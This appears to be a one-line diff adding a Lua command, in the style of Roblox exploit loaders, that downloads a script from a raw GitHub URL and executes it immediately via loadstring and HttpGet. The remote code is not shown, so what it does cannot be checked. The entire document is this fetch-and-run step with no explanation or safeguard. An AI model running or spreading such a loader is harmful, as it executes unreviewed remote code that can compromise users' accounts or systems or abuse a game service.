@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sx65/untitledbitch/main/dasdsasad"))()
